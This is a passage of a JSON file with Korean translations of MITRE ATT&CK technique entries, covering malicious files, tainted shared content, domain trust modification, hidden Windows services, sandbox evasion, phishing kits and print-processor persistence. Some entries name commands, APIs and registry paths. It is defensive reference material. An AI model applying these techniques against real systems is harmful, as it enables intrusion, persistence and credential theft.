    "description": "적대자는 사용자가 악성 파일을 열도록 의존하여 실행 권한을 얻을 수 있습니다. 사용자는 사회 공학을 통해 파일을 열도록 유도되어 코드 실행에 이르게 될 수 있습니다. 이러한 사용자 행동은 일반적으로 후속 행동으로 관찰됩니다. 적대자는 사용자가 실행해야 하는 여러 유형의 파일을 사용할 수 있으며, 여기에는 .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg 등이 포함됩니다.\n\n적대자는 사용자가 악성 파일을 열고 성공적으로 실행할 가능성을 높이기 위해 다양한 형태의 가장하기와 난독화된 파일이나 정보를 사용할 수 있습니다. 이러한 방법에는 익숙한 명명 규칙을 사용하거나 파일을 비밀번호로 보호하고 사용자가 이를 여는 방법에 대한 지침을 제공하는 것이 포함될 수 있습니다.\n\n악성 파일은 초기 접근 직후에 자주 발생하지만, 적대자가 파일을 공유 디렉토리나 사용자의 바탕화면에 배치하여 사용자가 클릭하기를 바라면서 발생하는 등의 다른 침입 단계에서도 발생할 수 있습니다. 이 활동은 내부 스피어 피싱 직후에도 관찰될 수 있습니다.",
    "external_id": "T1204.002",
    "modified": "2024-09-25T20:50:34.876Z",
    "translated": true
  },
  {
    "title": "Identify Business Tempo",
    "description": "적대자는 표적 선정에 사용할 수 있는 피해자의 비즈니스 템포에 대한 정보를 수집할 수 있습니다. 조직의 비즈니스 템포에 관한 정보는 운영 시간과 주의 특정 일 등 다양한 세부 사항을 포함할 수 있습니다. 이 정보는 피해자의 하드웨어와 소프트웨어 자원의 구매 및 배송 시간/날짜를 드러낼 수 있습니다.\n\n적대자는 정보 수집을 위해 여러 가지 방법을 사용할 수 있으며, 직접적으로 정보를 끌어내는 방식도 포함됩니다. 비즈니스 템포에 대한 정보는 온라인이나 다른 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다. 이러한 정보 수집은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 얻는 데 도움이 될 수 있습니다.",
    "external_id": "T1591.003",
    "modified": "2021-04-15T03:38:31.983Z",
    "translated": true
  },
  {
    "title": "Hardware",
    "description": "적대자는 타겟팅 과정에서 사용할 수 있는 피해자의 호스트 하드웨어에 대한 정보를 수집할 수 있습니다. 하드웨어 인프라에 대한 정보에는 특정 호스트의 유형 및 버전, 추가적인 방어 보호를 나타낼 수 있는 추가 구성 요소의 존재 등이 포함될 수 있습니다.\n\n적대자는 이러한 정보를 여러 가지 방법으로 수집할 수 있습니다. 예를 들어, 직접적인 수집 행위나 정보 피싱을 통해 정보를 수집할 수 있으며, 또한 공격자가 웹사이트를 침해한 다음 방문자로부터 호스트 정보를 수집하기 위해 설계된 악성 콘텐츠를 포함할 수 있습니다. 하드웨어 인프라에 대한 정보는 온라인이나 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 접근을 가능하게 할 수 있습니다.",
    "external_id": "T1592.001",
    "modified": "2021-10-17T16:32:10.810Z",
    "translated": true
  },
  {
    "title": "Taint Shared Content",
    "description": "적대 세력은 네트워크 드라이브나 내부 코드 저장소와 같은 공유 저장소에 콘텐츠를 추가하여 원격 시스템에 페이로드를 전달할 수 있습니다. 네트워크 드라이브나 기타 공유 위치에 저장된 콘텐츠는 유효한 파일에 악성 프로그램, 스크립트 또는 익스플로이트 코드를 추가하여 오염될 수 있습니다. 사용자가 오염된 공유 콘텐츠를 열면 악성 부분이 실행되어 적대 세력의 코드가 원격 시스템에서 실행될 수 있습니다. 적대 세력은 오염된 공유 콘텐츠를 사용하여 수평 이동할 수 있습니다.\n\n디렉토리 공유 피벗은 사용자가 공유 네트워크 디렉토리에 접근할 때 맬웨어를 전파하기 위해 여러 다른 기술을 사용하는 이 기술의 변형입니다. 이 기술은 디렉토리 .LNK 파일의 바로 가기 수정을 사용하여 실제 디렉토리처럼 보이게 하고, 이는 숨겨진 파일과 디렉토리를 통해 숨겨져 있습니다. 악성 .LNK 기반 디렉토리는 숨겨진 맬웨어 파일을 실행하는 내장 명령을 가지고 있으며, 그 이후에 사용자가 예상한 작업이 여전히 발생할 수 있도록 실제 의도된 디렉토리를 엽니다. 자주 사용되는 네트워크 디렉토리와 함께 사용될 경우, 이 기술은 빈번한 재감염과 시스템에 대한 광범위한 접근, 그리고 잠재적으로 새로운 높은 권한 계정에 대한 접근을 초래할 수 있습니다.\n\n적대 세력은 또한 공유 네트워크 디렉토리의 건강한 바이너리 앞이나 뒤에 자신의 코드를 추가함으로써 공유 네트워크 디렉토리를 손상시킬 수 있습니다. 맬웨어는 건강한 바이너리의 원래 진입점(OEP)을 수정하여 합법적인 코드보다 먼저 실행되도록 할 수 있습니다. 감염된 파일이 원격 시스템에서 실행될 때 감염은 계속해서 퍼질 수 있습니다. 이러한 감염은 .EXE, .DLL, .SCR, .BAT, 및/또는 .VBS와 같은 확장자를 가진 바이너리 및 비바이너리 형식을 대상으로 할 수 있습니다.",
    "external_id": "T1080",
    "modified": "2024-10-15T16:07:36.903Z",
    "translated": true
  },
  {
    "title": "Trust Modification",
    "description": "적대자는 새로운 도메인 신뢰를 추가하거나 기존 도메인 신뢰의 속성을 수정하거나, 방어를 회피하고 권한을 상승시키기 위해 도메인 및 테넌트 간의 신뢰 관계 구성을 변경할 수 있습니다. 사용자 ID가 연합된 여부와 같은 신뢰 세부정보는 공유 리소스에 접근하기 위해 도메인 또는 테넌트 간에 인증 및 권한 부여 속성이 적용될 수 있도록 합니다. 이러한 신뢰 개체에는 서버, 토큰 및 도메인에 적용되는 계정, 자격 증명 및 기타 인증 자료가 포함될 수 있습니다.\n\n이러한 신뢰를 조작함으로써 적대자는 자신이 제어하는 객체를 추가하기 위해 설정을 수정하여 권한을 상승시키거나 방어를 회피할 수 있습니다. 예를 들어, Microsoft Active Directory (AD) 환경에서는 서명 인증서를 손상시키지 않고도 새로운 자격 증명을 위조하기 위해 [SAML 토큰]을 위조하는 데 사용될 수 있습니다. 대신, 적대자는 도메인 신뢰를 조작하여 자신의 서명 인증서를 추가할 수 있습니다. 또한 적대자는 Active Directory Federation Services (AD FS)를 사용하여 AD 도메인을 연합 도메인으로 변환할 수 있으며, 이는 특정 사용자로 로그인하기 위해 주장 발급 규칙을 변경하는 등의 악의적인 신뢰 수정을 가능하게 할 수 있습니다.\n\n적대자는 또한 Okta나 AWS IAM Identity Center와 같은 ID 테넌트에 새로운 연합 신원 공급자를 추가할 수 있으며, 이는 적대자가 테넌트의 모든 사용자로 인증할 수 있게 할 수 있습니다. 이는 위협 행위자가 ID 테넌트를 활용하는 다양한 클라우드 기반 서비스에 폭넓게 접근할 수 있게 할 수 있습니다. 예를 들어, AWS 환경에서 적대자가 AWS 조직을 위한 새로운 ID 공급자를 생성하면, 각 구성원 계정을 위한 ID를 생성하지 않고도 모든 AWS 조직 구성원 계정에 연합할 수 있게 됩니다.",
    "external_id": "T1484.002",
    "modified": "2024-09-25T13:50:11.593Z",
    "translated": true
  },
  {
    "title": "Symmetric Cryptography",
    "description": "적대자들은 통신 프로토콜이 제공하는 내재적 방어에 의존하기보다는 알려진 대칭 암호화 알고리즘을 사용하여 명령 및 제어 트래픽을 숨길 수 있다. 대칭 암호화 알고리즘은 평문 암호화와 암호문 복호화에 동일한 키를 사용한다. 일반적인 대칭 암호화 알고리즘으로는 AES, DES, 3DES, Blowfish, RC4 등이 있다.",
    "external_id": "T1573.001",
    "modified": "2023-12-26T20:58:19.356Z",
    "translated": true
  },
  {
    "title": "Local Account",
    "description": "적대자는 로컬 시스템 계정의 목록을 얻으려 할 수 있습니다. 이 정보는 적대자가 시스템에 존재하는 로컬 계정을 확인하는 데 도움을 줄 수 있으며, 이후 행동에 도움이 됩니다.\n\n네트 유틸리티의 명령어인 `net user` 및 `net localgroup`과 macOS 및 Linux에서의 `id` 및 `groups` 명령어는 로컬 사용자 및 그룹을 나열할 수 있습니다. Linux에서는 또한 `/etc/passwd` 파일을 사용하여 로컬 사용자를 열거할 수 있습니다. macOS에서는 `dscl . list /Users` 명령어를 사용하여 로컬 계정을 열거할 수 있습니다.",
    "external_id": "T1087.001",
    "modified": "2024-01-11T23:47:44.655Z",
    "translated": true
  },
  {
    "title": "Safe Mode Boot",
    "description": "적대자들은 Windows 안전 모드를 악용하여 엔드포인트 방어를 비활성화할 수 있습니다. 안전 모드는 제한된 드라이버 및 서비스 집합으로 Windows 운영 체제를 시작합니다. 엔드포인트 탐지 및 대응(EDR) 도구와 같은 제3자 보안 소프트웨어는 안전 모드로 Windows를 부팅한 후 시작되지 않을 수 있습니다. 안전 모드에는 두 가지 버전이 있습니다: 안전 모드와 네트워킹이 포함된 안전 모드입니다. 안전 모드 부팅 후에는 추가 서비스를 시작할 수 있습니다.\n\n적대자들은 제한된 부팅으로 시작되지 않을 수 있는 엔드포인트 방어를 비활성화하기 위해 안전 모드를 악용할 수 있습니다. 호스트는 부팅 애플리케이션 설정을 관리하는 파일인 부트 구성 데이터(BCD) 저장소를 수정하여 다음 재부팅 후 안전 모드로 강제 전환될 수 있습니다.\n\n적대자들은 또한 관련 레지스트리 값을 수정하여 안전 모드에서 시작되는 최소 서비스 목록에 악성 애플리케이션을 추가할 수 있습니다. 악성 COM(구성 요소 개체 모델) 객체도 안전 모드에서 등록되고 로드될 수 있습니다.",
    "external_id": "T1562.009",
    "modified": "2021-08-31T14:51:47.352Z",
    "translated": true
  },
  {
    "title": "TFTP Boot",
    "description": "적대자는 네트부팅을 악용하여 무단 네트워크 장치 운영 체제를 TFTP 서버에서 로드할 수 있습니다. TFTP 부팅(네트부팅)은 네트워크 관리자가 중앙 관리 서버에서 구성 제어된 네트워크 장치 이미지를 로드하는 데 일반적으로 사용됩니다. 네트부팅은 부트 시퀀스의 한 옵션이며 장치 이미지를 중앙 집중화하고 관리하며 제어하는 데 사용할 수 있습니다.\n\n적대자는 네트워크 장치의 구성을 조작하여 악성 TFTP 서버를 사용하도록 지정할 수 있으며, 이는 장치 시작 또는 재설정 시 수정된 이미지를 로드하기 위해 시스템 이미지를 변경하는 것과 함께 사용될 수 있습니다. 무단 이미지는 적대자가 장치 구성을 수정하고 장치에 악성 기능을 추가하며 백도어를 도입하여 네트워크 장치를 제어하고 표준 기능을 사용하여 탐지를 최소화할 수 있게 합니다. 이 기술은 ROMMONkit과 유사하며 네트워크 장치가 수정된 이미지를 실행하게 만들 수 있습니다.",
    "external_id": "T1542.005",
    "modified": "2020-10-22T16:35:53.806Z",
    "translated": true
  },
  {
    "title": "Windows Service",
    "description": "적대자는 지속성을 위해 악성 페이로드를 반복적으로 실행하도록 Windows 서비스를 생성하거나 수정할 수 있습니다. Windows가 부팅될 때, 백그라운드 시스템 기능을 수행하는 프로그램이나 애플리케이션인 서비스를 시작합니다. Windows 서비스 구성 정보는 서비스의 실행 파일 경로 또는 복구 프로그램/명령이 Windows 레지스트리에 저장됩니다.\n\n적대자는 새로운 서비스를 설치하거나 기존 서비스를 수정하여 시작 시 실행되도록 하여 시스템에서 지속할 수 있습니다. 서비스 구성은 시스템 유틸리티(예: sc.exe)를 사용하거나 레지스트리를 직접 수정하거나 Windows API와 직접 상호작용하여 설정하거나 수정할 수 있습니다.\n\n적대자는 또한 서비스를 사용하여 악성 드라이버를 설치하고 실행할 수 있습니다. 예를 들어, 드라이버 파일을 디스크에 배치한 후, 페이로드는 `CreateServiceW()`와 같은 네이티브 API 기능을 통해 로드되고 등록될 수 있으며, 필요한 서비스 레지스트리 값을 생성하거나 `PnPUtil.exe`와 같은 명령줄 유틸리티를 사용할 수 있습니다. 적대자는 이러한 드라이버를 루트킷으로 활용하여 시스템에서 악성 활동의 존재를 숨길 수 있습니다. 또한 적대자는 취약한 서명된 드라이버를 손상된 머신에 로드할 수 있으며, 이것은 특권 상승을 위한 이용의 일환으로 이루어질 수 있습니다.\n\n서비스는 관리자 권한으로 생성될 수 있지만, SYSTEM 권한으로 실행되므로 적대자는 서비스를 사용하여 권한을 상승시킬 수도 있습니다. 적대자는 서비스 실행을 통해 서비스를 직접 시작할 수도 있습니다.\n\n탐지 분석을 더욱 어렵게 만들기 위해, 악성 서비스는 합법적인 운영 체제나 온건한 소프트웨어 구성 요소와 관련된 서비스 및/또는 페이로드 이름을 사용하는 등의 방식으로 서비스를 가장할 수 있습니다. 적대자는 또한 ‘숨겨진’ 서비스를 생성할 수 있으며, 예를 들어 `sc sdset` 명령을 사용하여 서비스 권한을 설정하여 Windows 서비스가 표준 서비스 나열 방법에서 보이지 않도록 숨길 수 있습니다.",
    "external_id": "T1543.003",
    "modified": "2024-04-11T19:25:51.394Z",
    "translated": true
  },
  {
    "title": "Fast Flux DNS",
    "description": "적의들은 빠른 플럭스 DNS를 사용하여 단일 도메인 해상도에 연결된 빠르게 변하는 IP 주소 배열 뒤에 명령 및 제어 채널을 숨길 수 있습니다. 이 기술은 완전한 도메인 이름을 사용하며, 여러 IP 주소가 할당되어 있으며 높은 빈도로 교체됩니다. 이는 라운드 로빈 IP 할당과 짧은 TTL(생존 시간)을 결합하여 DNS 리소스 레코드의 수명을 조절합니다.\n\n가장 간단한 \"단일 플럭스\" 방법은 단일 DNS 이름에 대한 DNS A(주소) 레코드 목록의 일부로 주소를 등록하고 해제하는 것입니다. 이러한 등록은 평균 5분의 수명을 가지며, IP 주소 해상도의 지속적인 혼잡을 초래합니다.\n\n대조적으로, \"이중 플럭스\" 방법은 DNS 영역의 DNS 네임 서버 레코드 목록의 일부로 주소를 등록하고 해제하여 연결에 대한 추가적인 복원력을 제공합니다. 이중 플럭스를 사용하면 추가 호스트가 C2 호스트의 프록시 역할을 할 수 있어, C2 채널의 진정한 출처를 더욱 차단할 수 있습니다.",
    "external_id": "T1568.001",
    "modified": "2020-03-27T16:10:37.183Z",
    "translated": true
  },
  {
    "title": "System Checks",
    "description": "적대자들은 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 시스템 점검을 사용할 수 있습니다. 이는 가상 머신 환경(VME) 또는 샌드박스를 나타내는 인공물의 존재 여부에 대한 점검 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 만약 적대자가 VME를 감지하면, 그들은 피해자로부터의 연결을 끊거나 임플란트의 핵심 기능을 숨기기 위해 악성 코드를 수정할 수 있습니다. 또한, 그들은 보조 또는 추가 페이로드를 배포하기 전에 VME 인공물을 검색할 수 있습니다. 적대자들은 자동화된 탐색 과정에서 얻은 정보를 바탕으로 후속 행동을 조정할 수 있습니다.\n\n특정 점검은 목표 또는 적대자에 따라 달라질 수 있지만, 시스템 정보를 얻고 VME 인공물을 검색하기 위해 Windows 관리 도구, PowerShell, 시스템 정보 탐색, 레지스트리 쿼리와 같은 행동이 포함될 수 있습니다. 적대자들은 메모리, 프로세스, 파일 시스템, 하드웨어 및/또는 레지스트리에서 VME 인공물을 검색할 수 있습니다. 또한, 적대자들은 이러한 점검을 하나의 스크립트로 자동화한 다음, 시스템이 가상 환경으로 판단되면 프로그램을 종료하도록 할 수 있습니다.\n\n점검에는 호스트/도메인 이름과 네트워크 트래픽 샘플과 같은 일반적인 시스템 속성이 포함될 수 있습니다. 적대자들은 네트워크 어댑터 주소, CPU 코어 수, 사용 가능한 메모리/드라이브 크기도 확인할 수 있습니다. 실행된 후, 악성 코드는 파일 및 디렉토리 탐색을 사용하여 예상치 못한 또는 분석 관련 명명 관습이 포함된 폴더나 파일에 저장되었는지를 확인할 수 있습니다.\n\n또한, 일반적인 점검은 이러한 응용 프로그램에 고유한 실행 중인 서비스 나 시스템에 설치된 프로그램, 가상 머신 응용 프로그램과 관련된 문자열에 대한 제조업체/제품 필드, VME 특정 하드웨어/프로세서 명령어를 열거할 수 있습니다. VMWare와 같은 응용 프로그램에서는 적대자들이 특별한 I/O 포트를 사용하여 명령을 전송하고 출력을 받을 수도 있습니다.\n\n팬, 온도 및 오디오 장치의 존재와 같은 하드웨어 점검도 가상 환경을 나타낼 수 있는 증거를 수집하는 데 사용될 수 있습니다. 적대자들은 이러한 장치의 특정 수치를 쿼리할 수도 있습니다.",
    "external_id": "T1497.001",
    "modified": "2024-09-12T15:50:18.047Z",
    "translated": true
  },
  {
    "title": "Cron",
    "description": "적대자는 <code>cron</code> 유틸리티를 악성 코드를 초기 또는 반복적으로 실행하기 위한 작업 예약에 악용할 수 있습니다. <code>cron</code> 유틸리티는 유닉스 계열 운영 체제를 위한 시간 기반 작업 스케줄러입니다. <code>crontab</code> 파일은 실행할 cron 항목의 일정과 지정된 실행 시간을 포함합니다. 모든 <code>crontab</code> 파일은 운영 체제별 파일 경로에 저장됩니다.\n\n적대자는 리눅스나 유닉스 환경에서 <code>cron</code>을 사용하여 시스템 시작 시 또는 예약된 기준으로 프로그램을 실행할 수 있습니다.",
    "external_id": "T1053.003",
    "modified": "2024-10-15T18:45:51.945Z",
    "translated": true
  },
  {
    "title": "Domain Groups",
    "description": "적대자들은 도메인 수준의 그룹 및 권한 설정을 찾으려고 할 수 있습니다. 도메인 수준 권한 그룹에 대한 지식은 적대자들이 어떤 그룹이 존재하는지와 특정 그룹에 속한 사용자가 누구인지 파악하는 데 도움을 줄 수 있습니다. 적대자들은 이 정보를 사용하여 도메인 관리자와 같은 권한이 상승된 사용자가 누구인지 결정할 수 있습니다.\n\n명령어는 도메인 수준의 그룹을 나열할 수 있습니다.",
    "external_id": "T1069.002",
    "modified": "2023-04-07T17:16:47.754Z",
    "translated": true
  },
  {
    "title": "Vulnerabilities",
    "description": "적대자는 타겟팅에 사용할 수 있는 취약점에 대한 정보를 획득할 수 있습니다. 취약점은 적대자가 의도하지 않거나 예상치 못한 행동을 발생시키기 위해 활용할 수 있는 컴퓨터 하드웨어나 소프트웨어의 약점을 말합니다. 적대자는 공개 데이터베이스를 검색하거나 비공식적인 취약점 데이터베이스에 접근하여 취약점 정보를 찾을 수 있습니다.\n\n적대자는 기존의 취약점뿐 아니라 새롭게 발견된 취약점의 상태를 이해하기 위해 취약점 공개/데이터베이스를 모니터링할 수 있습니다. 취약점이 발견되고 공개되기까지는 일반적으로 지연이 발생합니다. 적대자는 취약점 연구를 수행하는 것으로 알려진 시스템(상업적 공급업체 포함)을 타겟팅할 수 있습니다. 취약점에 대한 지식은 적대자가 기존의 악용 사례를 찾도록 하거나 직접 악용 사례를 개발하려고 시도하도록 할 수 있습니다.",
    "external_id": "T1588.006",
    "modified": "2021-04-15T03:16:32.119Z",
    "translated": true
  },
  {
    "title": "Clear Linux or Mac System Logs",
    "description": "적대자는 침입의 증거를 숨기기 위해 시스템 로그를 삭제할 수 있습니다. macOS와 Linux는 모두 시스템 또는 사용자 주도 작업을 시스템 로그를 통해 추적합니다. 대부분의 기본 시스템 로깅은 /var/log/ 디렉토리 아래에 저장됩니다. 이 디렉토리의 하위 폴더는 관련 기능에 따라 로그를 분류합니다.\n\n* /var/log/messages: 일반 및 시스템 관련 메시지\n* /var/log/secure 또는 /var/log/auth.log: 인증 로그\n* /var/log/utmp 또는 /var/log/wtmp: 로그인 기록\n* /var/log/kern.log: 커널 로그\n* /var/log/cron.log: 크론 로그\n* /var/log/maillog: 메일 서버 로그\n* /var/log/httpd/: 웹 서버 접근 및 오류 로그",
    "external_id": "T1070.002",
    "modified": "2020-03-29T21:23:51.886Z",
    "translated": true
  },
  {
    "title": "Application or System Exploitation",
    "description": "적대자는 애플리케이션이나 시스템이 충돌해 사용자에게 가용성을 제공하지 못하도록 하는 소프트웨어 취약점을 악용할 수 있습니다. 일부 시스템은 충돌이 발생할 때 중요한 애플리케이션과 서비스를 자동으로 재시작할 수 있지만, 이는 지속적인 서비스 거부(DoS) 상태를 유발하기 위해 다시 악용될 가능성이 높습니다.\n\n적대자는 알려진 취약점이나 제로데이 취약점을 악용하여 애플리케이션 및/또는 시스템을 충돌시킬 수 있으며, 이는 종속적인 애플리케이션 및/또는 시스템도 DoS 상태에 빠지게 만들 수 있습니다. 충돌하거나 재시작된 애플리케이션 또는 시스템은 데이터 파괴, 펌웨어 손상, 서비스 중단 등의 다른 영향을 미칠 수 있으며, 이는 추가적인 DoS 상태를 초래하고 중요한 정보, 애플리케이션 및/또는 시스템에 대한 가용성을 차단할 수 있습니다.",
    "external_id": "T1499.004",
    "modified": "2024-10-15T15:42:23.001Z",
    "translated": true
  },
  {
    "title": "Office Application Startup",
    "description": "적대자는 Microsoft Office 기반 애플리케이션을 활용하여 시작 사이에 지속성을 유지할 수 있습니다. Microsoft Office는 기업 네트워크 내의 Windows 기반 운영 체제에서 꽤 일반적인 애플리케이션 모음입니다. Office 기반 애플리케이션이 시작될 때 지속성을 위해 사용할 수 있는 여러 메커니즘이 있으며, 여기에는 Office 템플릿 매크로 및 추가 기능의 사용이 포함될 수 있습니다.\n\nOutlook에서 지속성을 얻기 위해 악용될 수 있는 다양한 기능이 발견되었습니다. 여기에는 Outlook 규칙, 양식 및 홈페이지가 포함됩니다. 이러한 지속성 메커니즘은 Outlook 내에서 작동하거나 Office 365를 통해 사용할 수 있습니다.",
    "external_id": "T1137",
    "modified": "2024-10-15T16:01:21.255Z",
    "translated": true
  },
  {
    "title": "InstallUtil",
    "description": "적대자들은 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시하기 위해 InstallUtil을 사용할 수 있습니다. InstallUtil은 .NET 바이너리에 지정된 특정 설치 구성 요소를 실행하여 리소스를 설치 및 제거할 수 있는 명령줄 유틸리티입니다. InstallUtil 바이너리는 Microsoft에 의해 디지털 서명되었을 수도 있으며, Windows 시스템의 .NET 디렉토리에 위치할 수 있습니다.\n\nInstallUtil은 또한 이진 내에서 속성을 사용하여 응용 프로그램 제어를 우회하는 데 사용될 수 있으며, 이 속성은 <code>[System.ComponentModel.RunInstaller(true)]</code>로 표시된 클래스를 실행합니다.",
    "external_id": "T1218.004",
    "modified": "2022-03-11T18:47:52.603Z",
    "translated": true
  },
  {
    "title": "Spearphishing Link",
    "description": "적대자들은 민감한 정보를 유출하기 위해 악성 링크가 포함된 스피어피싱 메시지를 보낼 수 있으며, 이 정보는 표적 공격에 사용될 수 있습니다. 정보 수집을 위한 스피어피싱은 표적이 정보를 공개하도록 속이려는 시도이며, 주로 자격 증명이나 기타 실행 가능한 정보를 포함합니다. 정보 수집을 위한 스피어피싱은 종종 정보를 수집할 이유가 있는 출처인 척하는 사회 공학 기술을 포함합니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 대상으로 한 전자적으로 전달되는 사회 공학입니다. 이 경우, 악성 이메일에는 사용자가 URL을 클릭하거나 복사하여 브라우저에 붙여넣도록 유도하는 사회 공학 텍스트가 일반적으로 포함된 링크가 포함되어 있습니다. 제공된 웹사이트는 합법적인 사이트의 클론일 수 있으며, 외형적으로 합법적인 사이트와 유사하고 실제 사이트의 요소를 포함하는 URL을 가질 수 있습니다. URL은 정수 또는 16진수 기반 호스트 이름 형식의 수용과 \"@\" 기호 이전의 텍스트 자동 버리기와 같은 URL 스키마의 특징을 이용하여 난독화될 수 있습니다.\n\n적대자들은 또한 피싱 메시지 내에 \"추적 픽셀\", \"웹 버그\" 또는 \"웹 비콘\"을 삽입하여 이메일 수신을 확인할 수 있으며, 동시에 IP 주소와 같은 피해자 정보를 프로파일링하고 추적할 수 있습니다. 이러한 메커니즘은 종종 작은 이미지(일반적으로 1픽셀 크기) 또는 그렇지 않은 난독화된 객체로 나타나며, 일반적으로 원격 서버에 대한 링크를 포함한 HTML 코드로 제공됩니다.\n\n적대자들은 \"브라우저 내 브라우저\"(BitB) 공격을 사용하여 전체 웹사이트를 스푸핑할 수 있습니다. HTML 기반 주소 표시줄이 합법적인 URL을 포함하는 것처럼 보이는 가짜 브라우저 팝업 창을 생성함으로써, 사용자가 자격 증명을 입력하도록 유도할 수 있으며, 일반적인 URL 검증 방법을 우회할 수 있습니다.\n\n적대자들은 `EvilProxy` 및 `Evilginx2`와 같은 피싱 키트를 사용하여 피해자와 합법적인 웹사이트 간의 연결을 프록시하여 중간자 피싱을 수행할 수 있습니다. 로그인에 성공하면 피해자는 합법적인 웹사이트로 리다이렉션되며, 적대자는 사용자 이름과 비밀번호 외에 세션 쿠키를 캡처합니다. 이를 통해 적대자는 MFA를 우회할 수 있습니다.\n\n적대자들은 또한 악성 링크를 QR 코드 형태로 전달할 수 있으며, 이러한 링크는 피해자를 자격 증명 피싱 페이지로 유도할 수 있습니다. QR 코드를 사용하면 URL이 이메일에 노출되지 않으므로 대부분의 자동 이메일 보안 스캔에서 탐지되지 않을 수 있습니다. 이러한 QR 코드는 사용자의 모바일 장치에 스캔되거나 직접 전달될 수 있으며, 이는 여러 관련 측면에서 보안이 덜할 수 있습니다. 예를 들어, 모바일 사용자는 모바일의 작은 화면 크기로 인해 진짜 웹사이트와 자격 증명 수집 웹사이트 간의 사소한 차이에 주목하지 못할 수 있습니다.\n\n가짜 웹사이트에서 정보는 웹 양식으로 수집되어 적대자에게 전송됩니다. 적대자들은 또한 과거 정찰 작업에서 수집된 정보를 사용하여 설득력 있고 믿을 수 있는 유인책을 만들 수 있습니다.",
    "external_id": "T1598.003",
    "modified": "2024-05-31T04:18:44.567Z",
    "translated": true
  },
  {
    "title": "SSH",
    "description": "적대자는 유효한 계정을 사용하여 안전한 쉘(SSH)을 통해 원격 컴퓨터에 로그인할 수 있습니다. 그런 다음 적대자는 로그인한 사용자의 권한으로 작업을 수행할 수 있습니다.\n\nSSH는 인증된 사용자가 다른 컴퓨터에서 원격 셸을 열 수 있도록 하는 프로토콜입니다. 많은 리눅스 및 macOS 버전에는 SSH가 기본적으로 설치되어 있지만, 일반적으로 사용자가 활성화할 때까지 비활성화되어 있습니다. SSH 서버는 표준 비밀번호 인증 또는 비밀번호 대신 또는 추가로 공개-개인 키 쌍을 사용하는 것으로 설정할 수 있습니다. 이 인증 시나리오에서 사용자의 공개 키는 해당 사용자가 로그인할 수 있는 키 쌍 목록이 포함된 특별한 파일에 있어야 합니다.",
    "external_id": "T1021.004",
    "modified": "2023-08-11T20:24:03.069Z",
    "translated": true
  },
  {
    "title": "Additional Cloud Roles",
    "description": "적대자는 적대자가 제어하는 클라우드 계정에 추가 역할이나 권한을 추가하여 테넌트에 대한 지속적인 접근을 유지할 수 있습니다. 충분한 권한이 있는 compromised 계정은 데이터 및 설정에 거의 무제한 접근할 수 있으며, 다른 관리자의 비밀번호를 재설정할 수 있는 능력도 포함됩니다. 이러한 계정 수정은 [계정 생성] 또는 기타 악의적인 계정 활동 직후에 발생할 수 있습니다. 적대자는 또한 자신이 침해한 기존의 [유효 계정]을 수정할 수 있습니다. 이는 특히 추가된 역할이 다른 계정으로의 수평 이동을 허용하는 경우 권한 상승으로 이어질 수 있습니다.\n\n예를 들어, AWS 환경에서 적절한 권한을 가진 적대자는 <code>CreatePolicyVersion</code> API를 사용하여 IAM 정책의 새로운 버전을 정의하거나 <code>AttachUserPolicy</code> API를 사용하여 침해된 사용자 계정에 추가 또는 별개의 권한을 부여하는 IAM 정책을 연결할 수 있습니다.\n\n일부 경우, 적대자는 희생자 클라우드 테넌트 외부의 적대자가 제어하는 계정에 역할을 추가할 수 있습니다. 이렇게 하면 이러한 외부 계정이 희생자 테넌트 내에서 행동을 수행할 수 있으며, 적대자가 [계정 생성]을 하거나 피해자가 소유한 계정을 수정할 필요가 없습니다.",
    "external_id": "T1098.003",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Print Processors",
    "description": "적대자는 시스템 부팅 시 지속성 및/또는 권한 상승을 위해 악성 DLL을 실행하기 위해 인쇄 프로세서를 악용할 수 있습니다. 인쇄 프로세서는 부팅 시 인쇄 스풀러 서비스(spoolsv.exe)가 로드하는 DLL입니다.\n\n적대자는 시작 시 악성 DLL을 로드하는 인쇄 프로세서를 추가함으로써 인쇄 스풀러 서비스를 악용할 수 있습니다. 인쇄 프로세서는 SeLoadDriverPrivilege가 활성화된 계정을 통해 AddPrintProcessor API 호출을 통해 설치할 수 있습니다. 대안으로, 인쇄 프로세서는 DLL을 가리키는 HKLM\\SYSTEM\\[CurrentControlSet 또는 ControlSet001]\\Control\\Print\\Environments\\[Windows 아키텍처: 예: Windows x64]\\Print Processors\\[사용자 정의]\\Driver 레지스트리 키를 추가하여 인쇄 스풀러 서비스에 등록될 수 있습니다.\n\n악성 인쇄 프로세서가 제대로 설치되려면 페이로드가 전용 시스템 인쇄 프로세서 디렉토리에 위치해야 하며, 이 디렉토리는 GetPrintProcessorDirectory API 호출을 통해 찾거나 이 디렉토리에서 상대 경로로 참조할 수 있습니다. 인쇄 프로세서가 설치된 후, 부팅 시 시작되는 인쇄 스풀러 서비스를 재시작해야 인쇄 프로세서가 실행됩니다.\n\n인쇄 스풀러 서비스는 SYSTEM 레벨 권한으로 실행되므로, 적대자가 설치한 인쇄 프로세서는 상승된 권한으로 실행될 수 있습니다.",
    "external_id": "T1547.012",
    "modified": "2023-10-04T14:16:17.655Z",
    "translated": true
  },
  {
    "title": "Spearphishing Attachment",
